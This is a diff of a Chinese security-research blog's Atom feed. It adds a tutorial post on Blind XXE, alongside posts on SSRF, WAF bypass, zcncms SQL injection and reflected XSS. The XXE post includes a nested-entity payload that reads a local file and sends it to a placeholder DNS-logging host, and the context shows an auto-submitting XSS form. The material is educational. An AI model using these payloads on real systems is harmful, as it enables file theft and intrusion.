@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://das.scusec.org/"/>
-  <updated>2016-08-23T03:01:30.000Z</updated>
+  <updated>2016-08-24T09:50:36.358Z</updated>
   <id>http://das.scusec.org/</id>
   
   <author>
@@ -16,10 +16,45 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>当提起Blind XXE时候会想到什么</title>
+    <link href="http://das.scusec.org/2016/08/24/ksss/"/>
+    <id>http://das.scusec.org/2016/08/24/ksss/</id>
+    <published>2016-08-24T09:50:36.358Z</published>
+    <updated>2016-08-24T09:50:36.358Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="http://dassec.b0.upaiyun.com/ksss/xml-2016-08-24.jpg" alt="enter description here"></p>
+<p>XXE（XML实体注入漏洞）顾名思义，漏洞的关键点在于服务器对外部实体的解析。外部实体中可以请求他域资源，也许在包括我之内的很多人在漏洞利用时会习惯的把XXE问题转换成SSRF的问题。<br><a id="more"></a></p>
+<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>前几天别人问我一个有趣的问题：<strong>Blind XXE和普通XXE本质区别是什么。</strong> 仔细想了想，我答不上来，由于类似于cloudeye的使用DNS泛析和URL请求记录是可以查看命令执行结果的，大家通常不会在意漏洞点程序是否预设了回显或者可以使用报错得到回显。所以找了一些资料，记录一下上面问题的答案和也顺便记录一下XXE漏洞形成的原因。</p>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>首先要搞清楚的是XML外部实体的概念。一般容易误以为外部是自己定义的意思，事实上外部实体是指实体的参数内容不是当前XML定义的而是从其他资源引入的，用<strong>SYSTEM</strong>和<strong>PUBLIC</strong>来申明，也就是我们常在XXE payload里面看到的样子。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="doctype">&lt;!DOCTYPE ANY [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY hello SYSTEM "http://%xx.xxx.yourcloudeye.xxx/%xx"&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>如果在外界可控的 web代码和xml的交互点 可以插入我们定义的xml实体并被服务器解析，这样就造成了一个XXE漏洞（这句话写了很多遍还是觉得难读通顺，用SQLi类推一下就比较好理解了）。以php为例搭了一个测试环境。</p>
+<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824092818.png" alt="enter description here"></p>
+<p>首先浏览器是可以解析XML的，当然，是没有权限解析外部实体的（不然url链接没人敢点了）。开始在lamp下搭发现的www用户解析外部实体权限也不够，于是在wamp环境给apache sa权限测试。下面是php使用simplexml_load_file解析xml文件代码。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">'b.xml'</span>)) &#123;</span><br><span class="line">    <span class="variable">$xml</span> = simplexml_load_file(<span class="string">'b.xml'</span>);</span><br><span class="line">	var_dump(<span class="variable">$xml</span>);</span><br><span class="line"><span class="comment">/*    echo($xml-&gt;title);</span><br><span class="line">    var_dump($xml);*/</span></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'Failed to open b.xml.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824094116.png" alt="enter description here"></p>
+<p>xxetest.php把b.xml的内容解析后输出一个SimpleXMLElement对象，供其他函数使用xml中各个节点的值。我们可以在平台上看到解析外部实体发送的请求。剩下的利用就比较直观了，在请求资源时使用<a href="http://端口探测或带上内网攻击向量；file://或者php://filter等读取文件；gopher://发送复杂请求等等。" target="_blank" rel="external">http://端口探测或带上内网攻击向量；file://或者php://filter等读取文件；gopher://发送复杂请求等等。</a></p>
+<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824094812.png" alt="enter description here"></p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>回到Blind XXE的问题，仔细看b.xml可以发现，在开始定义了hello这个实体后，节点中引入了一个 <strong>&amp;hello；</strong>。如果请求的资源存在，则可以在节点中看到hello的值，这就是有返回的XXE雏形。对b.xml稍作修改，使用file协议读取本地文件，结果如下图。</p>
+<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824100258.png" alt="enter description here"></p>
+<p>所以如果xml文件没有在节点中使用这个实体，或者节点中使用了&amp;hello；而可执行文件没有把值在response中返回的情况就属于Blind XXE。<br>如果进行端口探测等操作可以直接参考SSRF利用时间差来完成，如果要接收回显的话，也可以用实体嵌套来完成。如果xml解析器不支持嵌套定义有可以把gethello内容写在外部xml中再引用进来有时候可以绕过。<br>也有把hello的值作为参数传给自己服务器上的php中然后保存成文件的，原理差不多，但是没有DNS解析平台简洁直观。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="doctype">&lt;!DOCTYPE root [  </span><br><span class="line">&lt;!ENTITY % hello "file:///c:/1.txt"&gt;  </span><br><span class="line">&lt;!ENTITY % gethello "&lt;!ENTITY % param222 SYSTEM'http://xxx.yourcloudeye.xxx/%hello;'&gt;"&gt;  </span><br><span class="line">%gethello;  </span><br><span class="line">]&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>对XXE的总结就差不多到这里了，如果说Blind XXE和XXE有什么本质区别的话，大概是Blind会让有些人说的：“不就是发包看返回的”的扫描器比较头疼吧。<br>之前SSRF文章的坑也准备填上了，2准备把归纳的一些gopher构造方法，一些内网ip限制绕过策略，以及打造自己的SSRF自动化探测脚本三个方面总结一下。<br>最近发现自己关于程序底层和程序优化相关的比较弱，想学习一下，有好的资料请推荐给我嘛~~</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/ksss/xml-2016-08-24.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
+&lt;p&gt;XXE（XML实体注入漏洞）顾名思义，漏洞的关键点在于服务器对外部实体的解析。外部实体中可以请求他域资源，也许在包括我之内的很多人在漏洞利用时会习惯的把XXE问题转换成SSRF的问题。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="ksss,blind XXE,实体注入" scheme="http://das.scusec.org/tags/ksss-blind-XXE-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
     <title>浅谈WAF下的SQL注入绕过</title>
-    <link href="http://das.scusec.org/2016/08/23/waf-sql-bypass/"/>
-    <id>http://das.scusec.org/2016/08/23/waf-sql-bypass/</id>
-    <published>2016-08-23T03:01:30.000Z</published>
+    <link href="http://das.scusec.org/2016/08/24/waf-sql-bypass/"/>
+    <id>http://das.scusec.org/2016/08/24/waf-sql-bypass/</id>
+    <published>2016-08-24T09:49:05.100Z</published>
     <updated>2016-08-23T03:01:30.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>几个月前在一个SRC的一个夺旗赛看了一下，题目里遇到了他们用自己的云waf保护起来的靶机，不禁心里为出题人鼓掌。直接对靶机奉上绕过策略当然有点蠢萌，不过作为探索研究决定继续往下看了看，当时运气不错，一顿测试后还真的找到了一个sql injection的bypass方法过了那题，觉得这个简单的绕过策略他们应该能抓到，等补了再写博客。<a id="more"></a></p>
@@ -61,9 +96,9 @@
   
   <entry>
     <title>从入门到精通SSRF（1）</title>
-    <link href="http://das.scusec.org/2016/08/23/easy-to-SSRF-1/"/>
-    <id>http://das.scusec.org/2016/08/23/easy-to-SSRF-1/</id>
-    <published>2016-08-23T02:55:14.000Z</published>
+    <link href="http://das.scusec.org/2016/08/24/easy-to-SSRF-1/"/>
+    <id>http://das.scusec.org/2016/08/24/easy-to-SSRF-1/</id>
+    <published>2016-08-24T09:49:05.092Z</published>
     <updated>2016-08-23T02:55:14.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>很早就看到别人对这个漏洞的研究，但是完全没有预想到它能有这么大的能量。最初觉得请求他域资源如果限制不严格，可能导致安全边界穿越。然而边界穿越导致内网信息泄露并不是重点，最近的redis未授权、struts2命令执行等等存放在安全位置而忽略了安全配置的机器则把这个漏洞的能量放大了很多倍。<br><a id="more"></a></p>
@@ -102,7 +137,7 @@
     <link href="http://das.scusec.org/2016/08/23/code-audit-of-zcncms2/"/>
     <id>http://das.scusec.org/2016/08/23/code-audit-of-zcncms2/</id>
     <published>2016-08-22T16:00:00.000Z</published>
-    <updated>2016-08-23T02:42:21.000Z</updated>
+    <updated>2016-08-23T02:42:22.000Z</updated>
     
     <content type="html"><![CDATA[<p>接上一篇 <a href="http://wps2015.org/2016/08/05/code%20audit%20of%20zcncms/" target="_blank" rel="external">代码审计——zcncms后台SQL注入(一)</a>， 继续挖掘出zcncms的几处漏洞.<a id="more"></a></p>
 <h4 id="后台SQL注入"><a href="#后台SQL注入" class="headerlink" title="后台SQL注入"></a>后台SQL注入</h4><p>继上一篇参数$parentid未正确处理后，在/module/products/admincontroller/products_photo.php中，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(<span class="variable">$a</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'list'</span>:<span class="keyword">default</span>:<span class="comment">//list</span></span><br><span class="line">		<span class="comment">//列表</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$productid</span>)) &#123;</span><br><span class="line">			<span class="variable">$where</span> = <span class="string">' 1 = 1 '</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$where</span> = <span class="string">" productid = '"</span>.<span class="variable">$productid</span>.<span class="string">"' "</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$pageListNum</span>=<span class="number">12</span>;<span class="comment">//每页显示</span></span><br><span class="line">		<span class="variable">$totalPage</span>=<span class="number">0</span>;<span class="comment">//总页数</span></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line"><span class="keyword">case</span> <span class="string">'edit'</span>:<span class="comment">//</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$submit</span>))&#123;</span><br><span class="line">			<span class="variable">$info</span> = <span class="keyword">array</span>();</span><br><span class="line">			<span class="variable">$time</span> = time();</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line">				<span class="variable">$id</span> = intval(<span class="variable">$id</span>);</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$id</span> &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">					errorinfo(<span class="string">'变量错误'</span>,<span class="string">''</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="variable">$infoold</span> = <span class="variable">$products_photo</span>-&gt;GetInfo(<span class="string">''</span>,<span class="string">' id = '</span>.<span class="variable">$id</span>);				</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="variable">$productinfo</span> = <span class="variable">$products</span>-&gt;GetInfo(<span class="string">''</span>,<span class="string">' id = '</span>.<span class="variable">$productid</span>);</span><br><span class="line">			<span class="comment">//20120719</span></span><br><span class="line">			checkClassPower(<span class="string">'products'</span>,<span class="variable">$productinfo</span>[<span class="string">'classid'</span>]);</span><br></pre></td></tr></table></figure></p>
@@ -143,7 +178,7 @@
     <link href="http://das.scusec.org/2016/08/23/code-audit-of-zcncms1/"/>
     <id>http://das.scusec.org/2016/08/23/code-audit-of-zcncms1/</id>
     <published>2016-08-22T16:00:00.000Z</published>
-    <updated>2016-08-23T02:42:33.000Z</updated>
+    <updated>2016-08-23T02:42:34.000Z</updated>
     
     <content type="html"><![CDATA[<p>由于是后台注入，比较鸡肋，发上来供大家相互参考学习。zcncms版本1.2.14，官方网站地址：<br><a href="http://www.zcncms.com/" target="_blank" rel="external">zcncms</a><a id="more"></a></p>
 <h4 id="0x01-变量处理"><a href="#0x01-变量处理" class="headerlink" title="0x01 变量处理"></a>0x01 变量处理</h4><p>文件/include/common.inc.php中</p>
@@ -318,7 +353,7 @@
     <link href="http://das.scusec.org/2016/06/27/unusual-xss-exploit/"/>
     <id>http://das.scusec.org/2016/06/27/unusual-xss-exploit/</id>
     <published>2016-06-26T16:00:00.000Z</published>
-    <updated>2016-07-28T07:10:27.000Z</updated>
+    <updated>2016-07-28T07:10:28.000Z</updated>
     
     <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>反射型xss，相对于持久型xss来说比较鸡肋；需要欺骗用户点击构造好的链接，达到窃取cookie，或是进一步CSRF劫持用户操作的目的。若是get型的xss，javascript代码直接在url中，虽然有些怪异，也好歹能用，愿者上钩。<a id="more"></a>但是若js代码是在post数据包，或者是在header里，那就更显得鸡肋了，甚至无法利用。我查阅了大量的资料，有了下面的尝试。</p>
 <h3 id="0x02-POST型反射xss"><a href="#0x02-POST型反射xss" class="headerlink" title="0x02 POST型反射xss"></a>0x02 POST型反射xss</h3><p>对于post反射型xss，其实已经有比较成熟的利用方法：构造post表单，利用js直接提交。表单构造如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">form</span>  <span class="attribute">name</span>=<span class="value">"form"</span> <span class="attribute">id</span>=<span class="value">"form1"</span> <span class="attribute">method</span>=<span class="value">"post"</span> <span class="attribute">action</span>=<span class="value">"http://target.com/test.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">name</span>=<span class="value">"searchKey"</span> <span class="attribute">hidden</span>=<span class="value">"true"</span> <span class="attribute">value</span>=<span class="value">'test"&gt;&lt;img src=1 onerror=alert(document.domain)&gt;'</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'form1'</span>).submit();</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
@@ -568,7 +603,7 @@
     <link href="http://das.scusec.org/2016/02/19/hpfeeds/"/>
     <id>http://das.scusec.org/2016/02/19/hpfeeds/</id>
     <published>2016-02-19T09:13:55.000Z</published>
-    <updated>2016-07-28T07:35:33.000Z</updated>
+    <updated>2016-07-28T07:35:34.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00-hpfeeds协议是什么？"><a href="#0x00-hpfeeds协议是什么？" class="headerlink" title="0x00 hpfeeds协议是什么？"></a>0x00 hpfeeds协议是什么？</h2><p>hpfeeds是一个轻量级的验证发布-订阅协议(authenticated publish-subscribe protocol)。</p>
 <p>轻量级好理解，就是代码量相对较少，功能相对不复杂。那什么是发布-订阅协议呢？订阅发布协议定义了一种一对多的依赖关系，让多个订阅者对象同时监听某一个主题对象。这个主题对象在自身状态变化时，会通知所有订阅者对象，使它们能够自动更新自己的状态。它是为了解决这样一种情况的发生，一个对象的改变需要同时改变其他对象，而且它不知道具体有多少对象需要改变。我的理解，这就类似于发传单，目标发送通知，没有指定特定的对象，通知会自动传播，观察者自己决定是否需要看传单，发送者对于传单是否被看一无所知。 <a id="more"></a></p>
